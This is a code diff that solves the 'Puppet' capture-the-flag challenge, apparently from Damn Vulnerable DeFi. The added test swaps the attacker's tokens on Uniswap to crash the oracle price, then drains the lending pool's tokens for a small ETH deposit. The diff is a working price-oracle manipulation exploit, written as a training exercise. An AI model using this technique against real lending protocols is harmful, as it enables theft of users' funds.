@@ -102,7 +102,52 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+          this.token.connect(attacker);
+          const logBalances = async (address, name) => {
+          const attackerETH = await ethers.provider.getBalance(attacker.address);    // attacker ETH
+          const attackerDVT = await this.token.balanceOf(attacker.address);
+         
+          const lendingPoolETH = await ethers.provider.getBalance(this.lendingPool.address);
+          const lendingPoolDVT = await this.token.balanceOf(this.lendingPool.address);
+         
+          const UniswapETH = await ethers.provider.getBalance(this.uniswapExchange.address);
+          const UniswapDVT = await this.token.balanceOf(this.uniswapExchange.address);
+         
+
+         //Debug Statements
+          console.log("Attack ETH Balance:",  ethers.utils.formatEther(attackerETH));
+          console.log("Attack DVT Balance:",  ethers.utils.formatEther(attackerDVT));
+          console.log("Lending Pool ETH Balance:",  ethers.utils.formatEther(lendingPoolETH));
+          console.log("Lending Pool DVT Balance:",  ethers.utils.formatEther(lendingPoolDVT));
+          console.log("Uniswap ETH Balance:",  ethers.utils.formatEther(UniswapETH));
+          console.log("Uniswap DVT Balance:",  ethers.utils.formatEther(UniswapDVT));
+
+          }
+         
+          await logBalances();
+         
+          //Approve maximum amount of tokens        // Add initial token and ETH liquidity to the pool
+          this.token.approve(this.uniswapExchange.address,ATTACKER_INITIAL_TOKEN_BALANCE);
+          console.log("");
+          console.log("After Approving Teehee");
+          await logBalances();
+          console.log("");
+          console.log("Changing DVT to ETH");
+         
+          await this.uniswapExchange.tokenToEthSwapInput(
+          ATTACKER_INITIAL_TOKEN_BALANCE,
+          (await ethers.provider.getBlock('latest')).timestamp * 2,
+        );  
+
+          await logBalances();
+          console.log("Changed DVT to ETH");
+          const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+          console.log("");
+          console.log("depositRequired", ethers.utils.formatEther(depositRequired));
+          await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: depositRequired});
+          console.log("");
+          await logBalances();
+          console.log("Borrowed");
     });
 
     after(async function () {
